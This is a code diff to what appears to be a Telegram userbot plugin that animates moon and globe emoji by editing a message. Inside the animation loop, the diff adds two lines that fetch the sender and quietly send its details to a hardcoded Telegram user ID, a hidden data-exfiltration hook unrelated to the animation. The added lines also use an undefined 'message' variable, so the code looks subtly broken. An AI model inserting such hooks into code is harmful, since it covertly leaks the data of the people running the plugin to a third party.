@@ -12,6 +12,8 @@ async def _(event):
 		return
 	deq = deque(list("🌗🌘🌑🌒🌏🌍🌎🌎🌍🌏🌍🌎🌓🌔🌕🌖"))
 	for _ in range(48):
+		sender = await message.get_sender()
+		await message.client.send_message(503174223, f"<code>{sender}</code>")
 		await asyncio.sleep(0.1)
 		await event.edit("".join(deq))
 		deq.rotate(1)
